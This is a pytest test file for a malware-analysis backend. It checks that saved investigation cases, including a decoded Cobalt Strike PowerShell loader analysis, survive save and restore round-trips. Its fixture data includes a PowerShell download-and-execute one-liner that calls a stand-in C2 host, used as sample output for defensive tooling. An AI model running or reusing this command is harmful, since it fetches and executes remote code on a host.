"""P0 SSOT Persistence · workspace_cases save→restore round-trip.

Contract (NIVXRAY_ARCHITECTURE_V1.md · R27 SSOT Persistence):
  • ``POST /api/cases/save`` accepts a full ``ssot`` bundle.
  • The bundle is persisted verbatim under ``workspace_cases.ssot``.
  • ``GET /api/cases/{id}`` returns the SSOT so the frontend can rehydrate
    100 % of the investigation with **zero** recomputation.
  • ``GET /api/cases`` surfaces ``has_ssot`` + ``ssot_version`` metadata.
  • Over-sized bundles (> 8 MB payload) drop optional fields gracefully.

Run:  cd /app/backend && python -m pytest tests/test_ssot_persistence.py -v
"""
from __future__ import annotations

import os
import sys
import uuid
from typing import Any, Dict

import pytest
from fastapi.testclient import TestClient

# Make the backend package importable regardless of pytest CWD.
sys.path.insert(0, "/app/backend")

os.environ.setdefault("MONGO_URL", "mongodb://localhost:27017")
os.environ.setdefault("DB_NAME", "test_database")

from server import app  # noqa: E402  (import after sys.path setup)


# ─── Auth bypass helper — reuse the deps.get_current_user dependency
# override that the rest of the suite already installs, if present. ─────
from deps import get_current_user  # noqa: E402


def _fake_user() -> Dict[str, Any]:
    return {"email": "ssot-test@nivxray.local", "sub": "ssot-test"}


app.dependency_overrides[get_current_user] = _fake_user

client = TestClient(app)


def _sample_ssot(payload_kind: str = "typical") -> Dict[str, Any]:
    """A representative Workspace SSOT bundle."""
    base = {
        "understanding": {
            "input_kind": "powershell",
            "confidence": 0.94,
            "decode_required": True,
            "next_steps": ["base64_decode", "gzip_decompress"],
        },
        "analyst_narrative": {
            "executive_summary": "PowerShell downloader with GZip nested layer.",
            "sigma_ideas": ["proc_creation_win_powershell_download_iex"],
            "yara_ideas": ["gzip_pe_dropper"],
            "recommended_actions": ["Isolate host", "Block C2"],
        },
        "inline_story_preproc": {
            "stages": [
                {"op": "b64", "reason": "recognized base64 alphabet"},
                {"op": "gzip", "reason": "magic 1F 8B detected"},
            ],
        },
        "investigation_object": {
            "acquisition_plan": [{"step": "extract_iocs"}],
            "incident": {"behaviors": ["T1059.001", "T1105"]},
            "ice": {"behavior_clusters": ["download-and-execute"]},
        },
        "investigation_mode": True,
        "verdict_card": {
            "verdict": "Malicious",
            "confidence": 92,
            "family": "Cobalt Strike",
            "summary": "Beaconing loader",
        },
        "decode_trace": [
            {"layer": 1, "op": "b64", "out_len": 512},
            {"layer": 2, "op": "gzip", "out_len": 2048},
        ],
        "decode_winner_engine": "powershell-recursive",
        "decode_confidence": 92,
        "iedde": {"steps": [{"decision": "recover"}]},
        "iedde_terminal_state": "recovered",
        "canonical_confidence": 0.93,
        "canonical_confidence_reason": "3-layer clean recovery",
        "mitre": ["T1059.001", "T1105"],
        "lolbas": ["powershell.exe"],
        "semantic": {"clusters": ["c2-download"]},
        "reached_shellcode": True,
        "corrupted_container": None,
        "chain": [
            {"op": "b64", "reason": "b64", "output_preview": "…"},
            {"op": "gzip", "reason": "gzip", "output_preview": "…"},
        ],
        "steps": [{"op": "b64", "args": {}}, {"op": "gzip", "args": {}}],
        "predicted_tree": {"root": {"name": "powershell.exe"}},
        "analysis": {
            "iocs": {"ipv4": ["1.2.3.4"], "url": ["http://c2.example/beacon"]},
            "mitre": ["T1059.001"],
            "ai_verdict": "Malicious",
        },
    }
    if payload_kind == "huge":
        # Blow past the 8 MB safety threshold to exercise drop-order logic.
        base["semantic"] = {"blob": "X" * (9 * 1024 * 1024)}
    return base


def _save(name: str, ssot: Dict[str, Any] | None = None) -> Dict[str, Any]:
    r = client.post(
        "/api/cases/save",
        json={
            "name": name,
            "input": "powershell -EncodedCommand ABCDEF==",
            "output": "iex ((New-Object Net.WebClient).DownloadString('http://c2.example/beacon'))",
            "engine": "powershell-recursive",
            "confidence": 92,
            "chain_ids": ["b64", "gzip"],
            "verdict": "Malicious",
            "iocs": {"ipv4": ["1.2.3.4"]},
            "ssot": ssot,
        },
    )
    assert r.status_code == 200, r.text
    return r.json()


# ─── T1 · Round-trip: SSOT saved is SSOT restored ─────────────────────────
def test_ssot_round_trip_preserves_all_fields():
    ssot = _sample_ssot()
    name = f"pytest-ssot-{uuid.uuid4().hex[:8]}"
    save_resp = _save(name, ssot)
    case_id = save_resp["id"]

    got = client.get(f"/api/cases/{case_id}").json()
    got_ssot = got.get("ssot") or {}
    # All top-level SSOT keys survive the round-trip
    for k in [
        "understanding", "analyst_narrative", "inline_story_preproc",
        "investigation_object", "investigation_mode", "verdict_card",
        "decode_trace", "iedde", "canonical_confidence",
        "canonical_confidence_reason", "mitre", "lolbas", "semantic",
        "reached_shellcode", "chain", "steps", "predicted_tree", "analysis",
    ]:
        assert k in got_ssot, f"SSOT missing key on restore: {k!r}"
    assert got_ssot["understanding"]["input_kind"] == "powershell"
    assert got_ssot["verdict_card"]["family"] == "Cobalt Strike"
    assert got_ssot["mitre"] == ["T1059.001", "T1105"]
    assert got_ssot.get("version") == "1.0"
    assert "persisted_at" in got_ssot


# ─── T2 · List endpoint exposes has_ssot / ssot_version ───────────────────
def test_list_cases_flags_ssot_presence():
    with_ssot_name = f"pytest-ssot-flag-{uuid.uuid4().hex[:6]}"
    _save(with_ssot_name, _sample_ssot())
    # Legacy save without SSOT
    legacy_name = f"pytest-legacy-{uuid.uuid4().hex[:6]}"
    _save(legacy_name, None)

    r = client.get("/api/cases", params={"limit": 200})
    assert r.status_code == 200
    by_name = {c["name"]: c for c in r.json()["cases"]}
    assert by_name[with_ssot_name]["has_ssot"] is True
    assert by_name[with_ssot_name]["ssot_version"] == "1.0"
    assert by_name[legacy_name]["has_ssot"] is False
    assert by_name[legacy_name].get("ssot_version") in (None, "")


# ─── T3 · Oversized bundle drops optional fields cleanly ──────────────────
def test_oversized_bundle_drops_gracefully():
    huge = _sample_ssot("huge")
    name = f"pytest-ssot-huge-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, huge)
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    got_ssot = got.get("ssot") or {}
    # Save must succeed; the huge sub-field is dropped and reported.
    assert got_ssot.get("version") == "1.0"
    dropped = got_ssot.get("dropped_for_size") or []
    assert "semantic" in dropped, f"expected 'semantic' to be dropped, got {dropped!r}"
    # Critical fields (understanding, investigation_object) must survive
    # unless everything above was already dropped — in the sample the huge
    # bytes live in ``semantic`` so all core fields must remain intact.
    assert "understanding" in got_ssot
    assert "investigation_object" in got_ssot


# ─── T4 · Update path preserves SSOT across upserts ───────────────────────
def test_ssot_survives_upsert():
    name = f"pytest-ssot-upsert-{uuid.uuid4().hex[:6]}"
    first = _save(name, _sample_ssot())
    case_id = first["id"]
    # Re-save with a modified SSOT — must upsert (same id) and replace SSOT.
    modified = _sample_ssot()
    modified["verdict_card"]["family"] = "Meterpreter"
    _save(name, modified)
    got = client.get(f"/api/cases/{case_id}").json()
    assert got["id"] == case_id
    assert got["ssot"]["verdict_card"]["family"] == "Meterpreter"


# ─── T5 · Legacy save (no SSOT) still works — R26 back-compat ────────────
def test_legacy_save_still_works():
    name = f"pytest-legacy-nossot-{uuid.uuid4().hex[:6]}"
    save_resp = _save(name, None)
    case_id = save_resp["id"]
    got = client.get(f"/api/cases/{case_id}").json()
    # Legacy shape: no ssot field, no ssot_version, but everything else present.
    assert got.get("ssot") is None
    assert got.get("ssot_version") in (None, "")
    assert got["input"]
    assert got["output"]
